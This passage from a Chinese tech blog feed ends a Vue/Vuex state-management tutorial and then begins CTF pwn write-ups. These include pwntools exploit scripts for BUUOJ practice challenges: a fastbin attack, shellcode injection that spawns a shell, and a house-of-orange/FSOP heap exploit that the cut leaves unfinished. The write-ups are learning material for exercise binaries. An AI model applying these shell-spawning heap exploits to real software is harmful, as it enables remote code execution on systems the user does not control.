class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;loginMessage&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(loginMessage));</span><br><span class="line">          <span class="keyword">const</span> &#123; id, roles, realName &#125; = data;</span><br><span class="line">          <span class="comment">// 角色必须是非空数组!</span></span><br><span class="line">          <span class="keyword">if</span> (!roles || roles.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(<span class="string">&#x27;getInfo: 角色必须是非空数组!&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_USERID&#x27;</span>, id);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, roles);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_NAME&#x27;</span>, realName);</span><br><span class="line">          <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;userRights&#x27;</span>, roles);</span><br><span class="line">          <span class="comment">// commit(&#x27;SET_AVATAR&#x27;, avatar)</span></span><br><span class="line">          <span class="comment">// commit(&#x27;SET_INTRODUCTION&#x27;, introduction)</span></span><br><span class="line">          <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户登出</span></span><br><span class="line">  <span class="title function_">logout</span>(<span class="params">&#123; commit, state &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">logout</span>(state.<span class="property">token</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, []);</span><br><span class="line">          db.<span class="title function_">remove</span>(<span class="string">&#x27;router&#x27;</span>);</span><br><span class="line">          <span class="title function_">removeToken</span>();</span><br><span class="line">          <span class="title function_">resetRouter</span>();</span><br><span class="line">          <span class="title function_">resolve</span>();</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除token</span></span><br><span class="line">  <span class="title function_">resetToken</span>(<span class="params">&#123; commit &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, []);</span><br><span class="line">      <span class="title function_">removeToken</span>();</span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 动态修改权限</span></span><br><span class="line">  <span class="title function_">changeRoles</span>(<span class="params">&#123; commit, dispatch &#125;, role</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="title function_">async</span>(resolve) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> token = role + <span class="string">&#x27;-token&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, token);</span><br><span class="line">      <span class="title function_">setToken</span>(token);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> &#123; roles &#125; = <span class="keyword">await</span> <span class="title function_">dispatch</span>(<span class="string">&#x27;getInfo&#x27;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(roles, <span class="string">&#x27;rolesrolesroles&#x27;</span>);</span><br><span class="line">      <span class="title function_">resetRouter</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 根据角色生成可访问路由映射</span></span><br><span class="line">      <span class="keyword">const</span> accessRoutes = <span class="keyword">await</span> <span class="title function_">dispatch</span>(<span class="string">&#x27;permission/generateRoutes&#x27;</span>, roles, &#123;</span><br><span class="line">        <span class="attr">root</span>: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 动态添加可访问路由</span></span><br><span class="line">      router.<span class="title function_">addRoutes</span>(accessRoutes);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 重置已访问视图和缓存视图</span></span><br><span class="line">      <span class="title function_">dispatch</span>(<span class="string">&#x27;tagsView/delAllViews&#x27;</span>, <span class="literal">null</span>, &#123; <span class="attr">root</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样后可以按功能分 module 使用</p><p>页面中调用就是</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用mutations</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;api/SET_T&#x27;</span>, keys);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用actions</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/login&#x27;</span>, postUser).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;）</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有分module </span></span><br><span class="line"><span class="comment">// 那就是 this.$store.commit(&#x27;SET_T&#x27;, keys);</span></span><br><span class="line"><span class="comment">// 直接调用方法</span></span><br></pre></td></tr></table></figure><h1 id="四-解决vuex中刷新数据数据消失问题"><a class="markdownIt-Anchor" href="#四-解决vuex中刷新数据数据消失问题">#</a> 四、解决 vuex 中刷新数据，数据消失问题</h1><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203052127002.png" alt="image-20220305212724638"></p><h3 id="操作"><a class="markdownIt-Anchor" href="#操作">#</a> 操作</h3><p>在自定义的 waiter.js 中加入 sessionStorage</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;searchSpiderTask&#125; <span class="keyword">from</span> <span class="string">&quot;@/api/spider&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state =  &#123;</span><br><span class="line">  <span class="comment">// authInfo: JSON.parse(sessionStorage.getItem(&quot;COMPANY_AUTH_INFO&quot;)) || &#123;&#125;</span></span><br><span class="line">  <span class="attr">tableData</span>: <span class="title class_">JSON</span>.<span class="title function_">parse</span>(sessionStorage.<span class="title function_">getItem</span>(<span class="string">&quot;tableData&quot;</span>)) || [],</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">title</span>:<span class="string">&#x27;首页&#x27;</span>,</span><br><span class="line">  <span class="comment">// tableData:[],</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">  <span class="comment">// tableData: state =&gt; state.tableData,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// change:(state,text)=&gt;&#123;</span></span><br><span class="line">  <span class="comment">//   state.title=text;</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// add:(state)=&gt;&#123;</span></span><br><span class="line">  <span class="comment">//   state.count++</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">GET__tableData</span>(<span class="params">state,data</span>)&#123;</span><br><span class="line">    state.<span class="property">tableData</span>=data <span class="comment">//数据更改</span></span><br><span class="line">    sessionStorage.<span class="title function_">setItem</span>(<span class="string">&quot;tableData&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state.<span class="property">tableData</span>))  <span class="comment">//存sessionStorage</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">getList</span>(<span class="params">context</span>)&#123;</span><br><span class="line">      <span class="title function_">searchSpiderTask</span>().<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">          context.<span class="title function_">commit</span>(<span class="string">&#x27;GET__tableData&#x27;</span>,res.<span class="property">data</span>); <span class="comment">//传后端数据</span></span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  getters,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在对应的 vue 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//触发方法</span><br><span class="line">&lt;el-button type=&quot;primary&quot; plain @click=&quot;loopResult&quot; style=&quot;margin-left: 10px&quot;&gt;检查&lt;/el-button&gt;</span><br><span class="line"></span><br><span class="line">//method部分</span><br><span class="line">loopResult(data)&#123;</span><br><span class="line">      this.$store.dispatch(&#x27;waiter/getList&#x27;)  //传actions</span><br><span class="line"></span><br><span class="line">      searchSpiderTask().then(response =&gt; &#123;</span><br><span class="line">        console.log(response.code)</span><br><span class="line">        if(response.code===20000) &#123;</span><br><span class="line">          const h = this.$createElement</span><br><span class="line">          this.$notify(&#123;</span><br><span class="line">            title: &#x27;搜索成功&#x27;,</span><br><span class="line">            message: h(&#x27;i&#x27;, &#123;style: &#x27;color: teal&#x27;&#125;, &#x27;搜索成功&#x27;),</span><br><span class="line">            duration: 1000</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).catch(err =&gt; &#123;</span><br><span class="line">        console.log(err)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><h1 id="五-一些其他问题的解决方法"><a class="markdownIt-Anchor" href="#五-一些其他问题的解决方法">#</a> 五、一些其他问题的解决方法</h1><ul><li><a href="https://blog.csdn.net/qq_34817440/article/details/106382512?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5Bvuex%5D%20unknown%20local%20action%20ty&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-106382512.first_rank_v2_pc_rank_v29&amp;spm=1018.2226.3001.4187">报错：[vuex] unknown action type:***</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ PWN EXERCISE(二)</title>
      <link href="/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/"/>
      <url>/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>heap</p><span id="more"></span><h1 id="wustctf2020_easyfastfastbin-attack"><a class="markdownIt-Anchor" href="#wustctf2020_easyfastfastbin-attack">#</a> wustctf2020_easyfast(fastbin attack)</h1><p>基本 fastbin attack 利用，改 chunk 到 backdoor 地址，将 if 条件中的变量覆盖为 0 拿 shell</p><p>##　EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./wustctf2020_easyfast&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29433</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;size&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;index&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line">backdoor()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="starctf_2019_babyshellsyscall"><a class="markdownIt-Anchor" href="#starctf_2019_babyshellsyscall">#</a> starctf_2019_babyshell(syscall)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(<span class="string">&quot;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall&quot;</span>)</span><br><span class="line"><span class="comment"># sh = process(&quot;./starctf_2019_babyshell&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28428</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;plz:\n&quot;</span>,payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0xc</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="houseoforange_hitcon_2016house-of-orangefrop"><a class="markdownIt-Anchor" href="#houseoforange_hitcon_2016house-of-orangefrop">#</a> houseoforange_hitcon_2016(house of orange,frop)</h1><h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析">#</a> 题目分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031733544.png" alt="image-20220303173344428"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031748879.png" alt="image-20220303174804774"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031747576.png" alt="image-20220303174729507"></p><ul><li>Build the house 即 add 函数，最多只能创建 4 次 chunk</li></ul><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031748764.png" alt="image-20220303174836674"></p><ul><li><p>edit</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031753144.png" alt="image-20220303175308057"></p><p>其中可以重新输入长度进行堆溢出，最多 edit3 次</p><p>因此思路为首先使用 house of orange 释放出 unsorted bin 然后利用 FSOP 劫持程序流</p><blockquote><ol><li>申请一个小的 house，然后把 top chunk 的大小改小</li><li>申请一个较大的 house（此时原来的 topchunk 被释放进 unsorted bin），再申请一个 large bin 范围内的 house（切割 unsorted bin），利用该 house 泄露 libc 和堆地址</li><li>编辑 house，把剩下 unsorted bin 的 size 改为 0x60，并在其中伪造 <code>_IO_FILE_plus结构体</code> 和 <code>unsorted bin chunk</code></li><li>在这一步中，我们首先利用 unsorted bin attack 修改 <code>_IO_list_all</code> ，这需要把该 chunk 的 bk 改为 <code>_IO_list_all-0x10</code></li><li>再次 malloc，触发错误，获得 shell<br>malloc 时，对 unsorted bin 进行判断，此时该 chunk 的 size 为 0x60，不满足要求，就把该 chunk 放入 small bin，并且向 bk-&gt;fd 写入 main_arena+0x58，即向 <code>_IO_list_all</code>  写入 <code>main_arena+0x58</code> <br> 此时判断下一个 <code>unsorted bin（_IO_list_all）</code> ，而这里实际上没有 chunk，此时会触发错误<br>此时第一个 <code>_IO_FILE_plus结构体</code> 为 <code>main_arena+0x58</code> ，而它不满足条件，就通过_chain 调到下一个_ <code>IO_FILE_plus</code>  结构体， <code>_chain</code>  位于 0x68 偏移的地方， <code>main_arena+0x58+0x68=main_arena+0xc0</code> , 就是 <code>small bin</code>  中 0x60 大小的地方，这就回到了我们伪造的 <code>_IO_FILE_plus结构体</code> 。</li></ol></blockquote></li></ul><h2 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h2><h3 id="关于house-of-orange"><a class="markdownIt-Anchor" href="#关于house-of-orange">#</a> 关于 house of orange</h3><p>核心在于当题目中不存在 free 函数时，通过漏洞利用获得 free 的效果，即在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h3 id="fsop"><a class="markdownIt-Anchor" href="#fsop">#</a> FSOP</h3><p>在 libc 的 <code>_IO_list_all</code>  中，存放有一个 <code>_IO_FILE_plus</code>  结构体的指针，<br>如下图，它指向 <code>_IO_2_1_stderr_</code> ：</p><p><img src="https://img-blog.csdnimg.cn/20200427101745159.png" alt="在这里插入图片描述"></p><p>而 <code>_IO_FILE_plus</code>  结构体详细内容如下</p><p><img src="https://img-blog.csdnimg.cn/20200427101902924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE0NTgyMA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>其中_chain 指向下一个 <code>_IO_FILE_plus</code>  结构体</p><p>在 malloc 中，它调用 malloc_printerr 来打印错误，经过一系列调用，最终来到 <code>_IO_flush_all_lockp</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果满足以下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &gt; 0</span><br><span class="line">_IO_vtable_offset (fp) == 0</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>就会调用 _IO_OVERFLOW，并把结构体当做第一个参数传入<br>如果我们能够把 _IO_OVERFLOW 改为 system，并且伪造结构体，开头为 /bin/sh，就能获得 shell 了</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;, 29155)</span></span><br><span class="line"></span><br><span class="line">r= process(<span class="string">&#x27;houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">  r.send(content)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>) <span class="comment">#1-7</span></span><br><span class="line">  r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 